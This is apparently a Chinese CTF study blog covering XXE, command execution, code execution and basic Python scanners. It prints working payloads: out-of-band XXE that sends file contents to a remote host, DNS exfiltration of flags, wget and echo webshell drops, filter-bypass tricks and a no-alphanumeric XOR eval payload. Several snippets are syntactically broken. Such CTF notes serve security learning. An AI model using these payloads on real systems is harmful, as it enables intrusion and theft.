<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;wang&quot;&gt;</span><br><span class="line">&lt;!ENTITY book &quot;hhh&quot;&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;book;&lt;/author&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>一个实体由三部分构成：一个和号(&amp;)，一个实体名称，以及一个分号(;)。</li>
</ul>
<p><strong>外部声明</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">需要基于php解析</span><br></pre></td></tr></table></figure>





<p><strong>外部注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ELEMENT note (message)&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;file:///C:/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;message&gt;&amp;test;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>



<p>浏览器中不会解析读取数据，但是可基于php解析。</p>
<h3 id="XML盲注利用姿势"><a href="#XML盲注利用姿势" class="headerlink" title="XML盲注利用姿势"></a>XML盲注利用姿势</h3><p>实体参数基础</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体参数只能用于DID中，实体参数的声明和引用都是以%开头。</span><br></pre></td></tr></table></figure>



<p>实体参数：相当于实体的引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">	&lt;!ELEMENT a (b)&gt;</span><br><span class="line">	&lt;!ENTITY % c &quot;&lt;!ENTITY d &#x27;abcd&#x27;&gt;&quot;&gt; 定义(必须有空格)</span><br><span class="line">%c;   引用(无需空格，需要分号)</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;</span><br><span class="line">	&lt;b&gt;&amp;d;&lt;/b&gt;</span><br><span class="line">&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">最后输出abcd</span><br></pre></td></tr></table></figure>



<p>Blind XXE</p>
<p>盲XXE实验代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data=file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">	$xml=@simplexml_load_string($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>无法回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">	&lt;!ELEMENT a (b)&gt;</span><br><span class="line">	&lt;!ENTITY % c  SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">%c;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;</span><br><span class="line">	&lt;b&gt;&lt;/b&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<p>可访问远程地址，在本地读取文件后通过远程访问携带数据。((OOB)out of band)带外</p>
<p>POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">	&lt;!ELEMENT b ANY&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;url/payload.did&quot;&gt; </span><br><span class="line">	%dtd;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&lt;b&gt;&lt;/b&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>在url使用wireshark抓包：请求payload.did，但是不存在。</p>
<p>方法：构建接受实体参数值的php页面，记录flag值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">	&lt;!ELEMENT b ANY&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;file:///C:flag.txt&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://本地ip/payload.did&quot;&gt; </span><br><span class="line">	%dtd;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&lt;b&gt;&amp;send;&lt;/b&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<p>返回的内容</p>
<p>payload.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://本地ip:8888/?abc=%evil;&#x27;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>



<p>nc监听 8888端口，即可得到flag。</p>
<p>如果存在特殊字符的文件报错，使用php输入输出流读取文地文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-命令执行</title>
    <url>/2021/05/23/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>简单介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户通过浏览器提交执行命令，由于服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者从$PATH或程序执行环境的其他方面来执行一个恶意构造的代码</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行与代码执行区别：</span><br><span class="line">1、命令执行漏洞：直接调用操作系统命令</span><br><span class="line">直接</span><br><span class="line">2、代码执行漏洞：靠执行脚本代码调用操作系统命令</span><br><span class="line">间接</span><br></pre></td></tr></table></figure>





<p>命令执行函数</p>
<p>了解相关函数</p>
<p>参考文档</p>
<p><a href="https://www.php.net/manual/zh/ref.exec.php">https://www.php.net/manual/zh/ref.exec.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system函数</span><br><span class="line">exec函数</span><br><span class="line">shell_exec函数</span><br><span class="line">passthru函数 可以直接执行并输出结果</span><br><span class="line">``反引号与shell_exec函数类似。</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="命令执行分类"><a href="#命令执行分类" class="headerlink" title="命令执行分类"></a>命令执行分类</h4><p>根据有无输出结果，有无回显分类</p>
<p>判断是否存在命令执行姿势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、根据页面响应延时</span><br><span class="line">2、发送http请求，http服务端显示请求</span><br><span class="line">3、发送dns请求，dns服务端显示请求</span><br></pre></td></tr></table></figure>



<p><strong>延时执行</strong></p>
<p>在shell命令中，具有sleep命令可完成延时执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh |sleep 3</span><br><span class="line">-alh显示所有文件，有利于我们观察，管道符(分隔符也可以，分别执行)，前面输出结果作为后面的输入。</span><br></pre></td></tr></table></figure>

<p>利用于无回显漏洞代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">此命令不会将结果输出，我们通过延时执行判断是否存在命令执行。</span><br></pre></td></tr></table></figure>





<p><strong>http请求端口监听</strong></p>
<p>服务端设置监听80端口，等待连接，输出相应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 80</span><br><span class="line">或</span><br><span class="line">python -m SimpleHTTPServer -p 80</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 服务端ip地址:80</span><br><span class="line">通过curl进行连接</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">访问</span><br><span class="line">?cmd=curl ip:80</span><br><span class="line">若出现请求则存在命令执行漏洞。</span><br></pre></td></tr></table></figure>





<p><strong>dns请求</strong></p>
<p>网站</p>
<p><a href="http://dnslog.cn/">http://dnslog.cn/</a></p>
<p>或</p>
<p><a href="http://ceye.io/">http://ceye.io/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问</span><br><span class="line">?cmd=ping -c 3 xxx.dnslog.cn</span><br><span class="line">-c 设置ping次数</span><br></pre></td></tr></table></figure>



<p><strong>dnslog利用命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include(flag.txt)</span><br><span class="line">	$cmd=&#x27;ping -c 3.GET[&#x27;a&#x27;];&#x27;</span><br><span class="line">	echo $cmd;</span><br><span class="line">	$out=shell_exec($cmd);</span><br><span class="line">?&gt;</span><br><span class="line">由于无回显，不能直接cat读取文件内容，</span><br><span class="line">权限较高时，可以进行本地读取：</span><br><span class="line">?a=;copy flag.txt flag.txt</span><br><span class="line">然后直接访问flag.txt</span><br><span class="line"></span><br><span class="line">方法二dns请求读取</span><br><span class="line"></span><br><span class="line">去掉文本中的空格，然后把内容拼接到域名</span><br><span class="line">sed s/空格/没有任何内容/替换文本内容为空，[[:space:]]表示代码中的空格</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g.+子域名` g参数表示全局</span><br><span class="line">域名只能出现数字、下划线、横杠、字母，如果ping命令不支持特殊符号，我们需要进行替换</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g|tr &quot;&lt;|?|$|&#123;|&#125;|&#x27;|;|=&gt;&quot; &quot;0&quot;`.+子域名</span><br><span class="line">替换为0</span><br><span class="line">?a=`cat flag.txt|sed s/[[:space:]]//g|tr &quot;&lt;|?|$|&#123;|&#125;|&#x27;|;|=&gt;&quot; &quot;1&quot;`.+子域名</span><br><span class="line">替换为1，对比猜出flag。</span><br></pre></td></tr></table></figure>





<h4 id="命令执行技巧"><a href="#命令执行技巧" class="headerlink" title="命令执行技巧"></a>命令执行技巧</h4><p>利用linux shell中特性</p>
<p><strong>linux shell分隔符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a </span><br><span class="line">%0d</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">||前面错了，才会执行后面的。</span><br><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">	$b=shell_exec(&#x27;echo &#x27;.$a);</span><br><span class="line">	echo $b;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?a=abc%0d`whoami`记得反引号</span><br><span class="line">?a=abc;whoami</span><br></pre></td></tr></table></figure>





<p><strong>linux shell空格</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09</span><br><span class="line">$IFS$9</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS</span><br></pre></td></tr></table></figure>



<h4 id="常见绕过技巧"><a href="#常见绕过技巧" class="headerlink" title="常见绕过技巧"></a>常见绕过技巧</h4><p><strong>1、重定义变量 绕过命令过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;a=l;b=s;$a$b</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>



<p><strong>2、base64编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`echo base64编码| base64 -d`</span><br></pre></td></tr></table></figure>



<h4 id="长度限制命令执行"><a href="#长度限制命令执行" class="headerlink" title="长度限制命令执行"></a>长度限制命令执行</h4><p>无长度限制，可上传webshell，下载webshell，并重命名为x.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$output=shell_exec($cmd);</span><br><span class="line">	echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当前用户对该目录具有读写权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、执行命令</span><br><span class="line">wget ip/a mv a a.php</span><br><span class="line"></span><br><span class="line">2、直接写入webshell</span><br><span class="line">执行命令</span><br><span class="line">echo &lt;?php &quot;eval($_POST[1];)&quot; &gt; a.php</span><br></pre></td></tr></table></figure>



<p>存在长度限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用w&gt;重定向，拼接,倒序执行，其中\是长命令分隔，可将一条命令在多行执行，这里没有使用到。</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">w&gt;&#x27;?&gt;&#x27;</span><br><span class="line">W&gt;&#x27;($_POST[]);&#x27;</span><br><span class="line">W&gt;&#x27;eval&#x27;</span><br><span class="line">w&gt;&#x27;&lt;?php&#x27;</span><br><span class="line">ls -t &gt;1.php</span><br></pre></td></tr></table></figure>





<h4 id="无数字字母的执行"><a href="#无数字字母的执行" class="headerlink" title="无数字字母的执行"></a>无数字字母的执行</h4><p>php生成异或代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=&#x27;~@#$%^&amp;*()_+/?.,&lt;&gt;-=&#123;&#125;[]|&#x27;;</span><br><span class="line">	for($i=0;$i&lt;strlen($a);$i++)</span><br><span class="line">		for($j=0;$j&lt;strlen($a);$j++)&#123;</span><br><span class="line">			if(ord($a[$i]^$a[$j])&gt;64 &amp;&amp; ord($a[$i]^$a[$j])&lt;91)&#123;</span><br><span class="line">			echo $a[$i].&#x27;  xor  &#x27;.$a[$j].&#x27;  is  &#x27;;</span><br><span class="line">			echo chr(ord($a[$i]^$a[$j])).&#x27; &#x27;;</span><br><span class="line">			echo ord( $a[$i]^$a[$j]);</span><br><span class="line">			echo &quot;\n&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	else  if(ord($a[$i]^$a[$j])&gt;96 &amp;&amp; ord($a[$i]^$a[$j])&lt;122)&#123;</span><br><span class="line">			echo $a[$i].&#x27;  xor  &#x27;.$a[$j].&#x27;  is  &#x27;;</span><br><span class="line">			echo chr(ord($a[$i]^$a[$j])).&#x27; &#x27;;</span><br><span class="line">			echo ord($a[$i]^$a[$j]);</span><br><span class="line">			echo &quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	?&gt;</span><br></pre></td></tr></table></figure>











<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function getFlag()&#123;</span><br><span class="line">		echo flag&#123;&#x27;xxx&#x27;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">	if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">		$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">		if(preg_match(&quot;/[A-Za-z0-9]+/&quot;($code))&#123;</span><br><span class="line">			die(&quot;no&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		echo $code;</span><br><span class="line">		eval($code);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">	highlight_file(__FILE__)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$_=&#x27;&lt;&gt;&#123;=@^[&#x27;  ^ &#x27;[[/&#123;,?&lt;&#x27;;$_();</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-脚本基础</title>
    <url>/2021/06/01/CTF-%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h3 id="python脚本基础"><a href="#python脚本基础" class="headerlink" title="python脚本基础"></a>python脚本基础</h3><p><strong>requests库使用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line"></span><br><span class="line">req=requests.get(url)</span><br><span class="line">req.encoding=&#x27;utf-8&#x27;#修改编码</span><br><span class="line">print(req.text)#输出字符串</span><br><span class="line">print(req.content)#输出字节类型</span><br><span class="line">把字节转化成字符串</span><br><span class="line">print(req.content.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>





<p><strong>requests模块介绍</strong></p>
<p>请求-响应都是对象</p>
<p>请求：get、post方法进行http请求</p>
<p>User-Agent为浏览器标识，网站根据User-Agent的值判断是否是浏览器的请求，前面在学习python爬虫的时候，就需要伪装浏览器进行内容的爬取。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">headers=&#123;&quot;User-Agent&quot;:&quot;xxx&quot;&#125;</span><br><span class="line">request.get(url,headers=headers)</span><br></pre></td></tr></table></figure>





<p><strong>响应：属性获取响应的内容。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">响应状态码</span><br><span class="line">req.status_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应-请求头</span><br><span class="line">req.request.headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应头</span><br><span class="line">req.headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应-请求cookie</span><br><span class="line">req.request._cookies</span><br><span class="line"></span><br><span class="line">响应cookie</span><br><span class="line">req.cookies</span><br></pre></td></tr></table></figure>







<p><strong>python与burp联动代理</strong></p>
<p>python设置代理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">	&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">	&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.get(url,proxies=proxies)</span><br></pre></td></tr></table></figure>







<p><strong>带参数的HTTP GET请求</strong></p>
<p>1、url直接设置提交参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://www.baidu.com?wd=helloworld&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">	&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">	&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.get(url,proxies=proxies)</span><br></pre></td></tr></table></figure>





<p>2、通过params字典提交参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">params=&#123;&quot;wd&quot;:&quot;helloworld&quot;&#125;</span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">	&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">	&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.get(url,proxies=proxies,params=params)</span><br></pre></td></tr></table></figure>





<p><strong>带参数的 HTTP POST请求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">	&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">	&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.post(url,proxies=proxies,data=data)</span><br></pre></td></tr></table></figure>



<p>对比python post提交和页面post请求的内容区别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python提交少了cookie信息</span><br></pre></td></tr></table></figure>





<p><strong>Cookie作用与使用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">保存用户状态信息</span><br></pre></td></tr></table></figure>



<p>利用http请求头中的cookie头携带</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">	&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">	&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">headers=&#123;&quot;Cookie&quot;:&quot;xxx&quot;&#125;</span><br><span class="line">req=requests.post(url,proxies=proxies,data=data,headers=headers)</span><br></pre></td></tr></table></figure>





<p><strong>为了更方便在python中使用cookie，requests模块中提供了保持会话的方法session()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">	&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">	&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">s=request.session()</span><br><span class="line">req1=s.get(url,proxies=proxies)#保存cookie</span><br><span class="line">print(req1.headers)</span><br><span class="line">data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">req2=s.post(url,proxies=proxies,data=data)</span><br></pre></td></tr></table></figure>





<p><strong>默认requests超时比较长，此时可缩短超时限制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">	&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">	&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">s=request.session()</span><br><span class="line">req1=s.get(url,proxies=proxies)#保存cookie</span><br><span class="line">print(req1.headers)</span><br><span class="line">data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">req2=s.post(url,proxies=proxies,data=data,timeout=3)</span><br></pre></td></tr></table></figure>









<h4 id="Python-SQL注入自动化检测"><a href="#Python-SQL注入自动化检测" class="headerlink" title="Python SQL注入自动化检测"></a>Python SQL注入自动化检测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送可能构造错误的SQL语句，若发生错误，存在SQL注入漏洞。</span><br></pre></td></tr></table></figure>





<p><strong>关键词 SQL syntax</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;&quot;</span><br><span class="line">params=&#123;&quot;id&quot;:&quot;&#x27;&quot;&#125;</span><br><span class="line">req=requests.get(url,params=params)</span><br><span class="line">if req.text.find(&quot;SQL syntax&quot;) !=-1:</span><br><span class="line">	print(&quot;find sql inject&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&#x27;no&#x27;)</span><br></pre></td></tr></table></figure>













<h4 id="Python-XSS自动化检查"><a href="#Python-XSS自动化检查" class="headerlink" title="Python XSS自动化检查"></a>Python XSS自动化检查</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检测思路：</span><br><span class="line">发送XSS Payload，筛选是否具有payload，那么存在XSS。</span><br></pre></td></tr></table></figure>



<p>Python XSS检测代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;&quot;</span><br><span class="line">payload=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span><br><span class="line"></span><br><span class="line">params=&#123;&quot;a&quot;:payload&#125;</span><br><span class="line">req=requests.get(url,params=params)</span><br><span class="line">if req.text.find(payload)!=-1:</span><br><span class="line">	print(&quot;xss found&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;no xss&quot;)</span><br></pre></td></tr></table></figure>





<p><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></p>
<p>下载XSS Payload List，新建文件，替换payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xss_payload.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	payload_list=f.readlines()</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">		payload.strip()<span class="comment">#去除空格</span></span><br><span class="line">		params=&#123;<span class="string">&quot;a&quot;</span>:payload&#125;</span><br><span class="line">		req=requests.get(url,params=params)</span><br><span class="line">		<span class="keyword">if</span> req.text.find(payload)!=-<span class="number">1</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;xss found&quot;</span>)</span><br><span class="line">			sys.exit()<span class="comment">#找到退出</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;no xss&quot;</span>)</span><br></pre></td></tr></table></figure>













<h4 id="Python源码泄漏自动化挖掘"><a href="#Python源码泄漏自动化挖掘" class="headerlink" title="Python源码泄漏自动化挖掘"></a>Python源码泄漏自动化挖掘</h4><p>常见源码泄漏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.git、.svn、.DS_Store以及backup.zip等目录或文件</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payloads=[&#x27;.git&#x27;,&#x27;.svn&#x27;,&#x27;.DS_Store&#x27;,&#x27;backup.zip&#x27;]</span><br><span class="line">url=&quot;&quot;</span><br><span class="line">for payload in payloads:</span><br><span class="line">	req=requests.get(url+ &quot;/&quot;+payload)</span><br><span class="line">	if req.status_code==200 : </span><br><span class="line">		print(&quot;yes:&quot;+req.request.url )</span><br><span class="line">		break</span><br><span class="line">	else:</span><br><span class="line">		continue</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>添加txt字典遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payloads=[&#x27;.git&#x27;,&#x27;.svn&#x27;,&#x27;.DS_Store&#x27;,&#x27;backup.zip&#x27;]</span><br><span class="line">with open(&quot;urls.txt&quot;,&quot;r&quot;) as f :</span><br><span class="line">	url_list=f.readlines()</span><br><span class="line">	for url in url_list:</span><br><span class="line">        for payload in payloads:</span><br><span class="line">            req=requests.get(url+ &quot;/&quot;+payload)</span><br><span class="line">            if req.status_code==&#x27;200&#x27;:</span><br><span class="line">                print(&quot;yes&quot;)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-代码执行</title>
    <url>/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>代码执行介绍</p>
<p>五类相关函数</p>
<p>1、eval+assert函数</p>
<p>2、preg_replace/e最新php不支持，php5广泛使用</p>
<p>3、用户自定义函数</p>
<p>4、动态函数</p>
<p>5、其他</p>
<p>1、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(php4 php5 php7)--把字符串作为php代码执行，当用户可以控制字符串内容，那么此时存在代码注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	eval(&#x27;phpinfo;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">eval执行的代码必须加分号，不然会报错。</span><br><span class="line">assert类似，但是兼容性更强，字符串中可不加分号，但是php7.1以上已经废弃assert</span><br></pre></td></tr></table></figure>



<p>安全人员防御：加引号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	eval(&quot;\$ret=strtolower(&#x27;$cmd&#x27;);&quot;)//将字符串转为小写，反斜杠转义$,为了不当做变量处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>绕过姿势：</p>
<p>闭合+注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);phpinfo();//注释掉后面的内容</span><br><span class="line">传入变成</span><br><span class="line">$ret=strtolower(&#x27;&#x27;);phpinfo();//</span><br></pre></td></tr></table></figure>

